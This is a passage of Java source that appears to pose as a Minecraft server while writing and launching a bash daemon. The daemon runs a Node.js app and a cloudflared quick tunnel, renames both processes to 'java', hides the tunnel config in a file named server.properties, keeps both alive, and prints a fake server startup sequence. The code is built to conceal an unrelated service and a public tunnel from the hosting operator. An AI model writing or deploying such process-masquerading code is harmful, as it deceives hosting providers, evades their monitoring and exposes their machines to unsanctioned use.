        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "PORT=$(cat \"$WORK_DIR/.node_port\" 2>/dev/null || echo \"25565\")\n" +
        "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
        "\n" +
        "write_cf_config() {\n" +
        "    local PROTO=$1\n" +
        "    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://localhost:$PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "}\n" +
        "\n" +
        "start_cf_tunnel() {\n" +
        "    local PROTO=$1\n" +
        "    local LOG_FILE=$2\n" +
        "    write_cf_config \"$PROTO\"\n" +
        "    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n" +
        "    echo $!\n" +
        "}\n" +
        "\n" +
        "NODE_PID=$(head -1 \"$WORK_DIR/.pids\" 2>/dev/null)\n" +
        "\n" +
        "while true; do\n" +
        "    NEED_RESTART=false\n" +
        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
        "        NEED_RESTART=true\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
        "        cd \"$APP_DIR\"\n" +
        "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
        "        nohup bash -c \"exec -a java \\\"$NODE_FAKE\\\" $NODE_SCRIPT\" >> \"$WORK_DIR/.node_app.log\" 2>&1 &\n" +
        "        NODE_PID=$!\n" +
        "        echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "        for i in $(seq 1 30); do\n" +
        "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
        "            sleep 1\n" +
        "        done\n" +
        "    fi\n" +
        "    \n" +
        "    NEED_REBUILD=false\n" +
        "    if [ -f \"$WORK_DIR/.cf/tunnel_url.txt\" ] && [ \"" + cfMode + "\" != \"fixed\" ]; then\n" +
        "        SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
        "        SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
        "        \n" +
        "        if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
        "            NEED_REBUILD=true\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"false\" ]; then\n" +
        "            SAVED_URL=$(head -1 \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null)\n" +
        "            if [ -n \"$SAVED_URL\" ]; then\n" +
        "                HC=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then\n" +
        "                    sleep 5\n" +
        "                    HC2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then\n" +
        "                        NEED_REBUILD=true\n" +
        "                    fi\n" +
        "                fi\n" +
        "            fi\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
        "            [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null\n" +
        "            pkill -f \"$CF_BIN\" 2>/dev/null\n" +
        "            pkill -f 'cloudflared.*tunnel' 2>/dev/null\n" +
        "            sleep 2\n" +
        "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            \n" +
        "            for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
        "                rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "                NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\")\n" +
        "                sleep 5\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
        "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | tail -1)\n" +
        "                if [ -z \"$NEW_URL\" ]; then\n" +
        "                    kill $NEW_PID 2>/dev/null\n" +
        "                    continue\n" +
        "                fi\n" +
        "                sleep 3\n" +
        "                V=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
        "                    echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                    break\n" +
        "                else\n" +
        "                    sleep 5\n" +
        "                    V2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n" +
        "                        echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                        break\n" +
        "                    else\n" +
        "                        kill $NEW_PID 2>/dev/null\n" +
        "                    fi\n" +
        "                fi\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "    sleep 15\n" +
        "done\n" +
        "DAEMONSCRIPT\n" +
        "chmod +x daemon.sh\n" +
        "nohup ./daemon.sh >> daemon.log 2>&1 &\n" +
        "echo \"$!\" >> .pids\n";

        Files.writeString(script, content);
        script.toFile().setExecutable(true);
        Files.writeString(dir.resolve(".pids"), "");
        return script;
    }

    // ============================================================
    // 执行部署脚本
    // ============================================================

    private static void executeDeployScript(Path script) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
        pb.directory(script.getParent().toFile());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        Process p = pb.start();
        Thread t = new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                while (r.readLine() != null) {}
            } catch (IOException ignored) {}
        }, "Deploy-Log");
        t.setDaemon(true);
        t.start();
        if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); }
    }

    // ============================================================
    // 读取部署信息
    // ============================================================

    private static void readDeployInfo() {
        Path dir = Paths.get(MC_BOT_DIR);
        
        Path portFile = dir.resolve(".node_port");
        for (int i = 0; i < 30; i++) {
            try {
                if (Files.exists(portFile)) {
                    String content = Files.readString(portFile).trim();
                    if (!content.isEmpty()) {
                        nodePort = content.split("\\n")[0].trim();
                        break;
                    }
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
        }
        
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        for (int i = 0; i < 60; i++) {
            try {
                if (Files.exists(urlFile)) {
                    String rawUrl = Files.readString(urlFile).trim();
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                        "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                    ).matcher(rawUrl);
                    if (m.find()) {
                        tunnelUrl = m.group(1);
                        lastKnownTunnelUrl.set(tunnelUrl);
                        break;
                    }
                    if (rawUrl.startsWith("https://")) {
                        tunnelUrl = rawUrl.split("\\n")[0].trim();
                        lastKnownTunnelUrl.set(tunnelUrl);
                        break;
                    }
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
        }
    }

    // ============================================================
    // 隧道链接变化监控
    // ============================================================

    private static void startTunnelMonitor() {
        if (tunnelMonitorRunning.getAndSet(true)) return;

        Thread monitor = new Thread(() -> {
            try { Thread.sleep(20000); } catch (InterruptedException ignored) {}

            while (tunnelMonitorRunning.get()) {
                try {
                    Thread.sleep(12000);

                    Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                    if (!Files.exists(urlFile)) continue;

                    String content = Files.readString(urlFile).trim();
                    if (content.isEmpty()) continue;

                    String currentUrl = "";
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                        "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                    ).matcher(content);
                    
                    if (m.find()) {
                        currentUrl = m.group(1);
                    } else if (content.startsWith("https://")) {
                        currentUrl = content.split("\\n")[0].trim();
                    }

                    if (currentUrl.isEmpty()) continue;

                    String lastUrl = lastKnownTunnelUrl.get();
                    if (!currentUrl.equals(lastUrl)) {
                        lastKnownTunnelUrl.set(currentUrl);
                        tunnelUrl = currentUrl;
                        printFakeStartupSequence(currentUrl);
                    }

                } catch (Exception ignored) {}
            }
        }, "Tunnel-Monitor");

        monitor.setDaemon(true);
        monitor.start();
    }
}
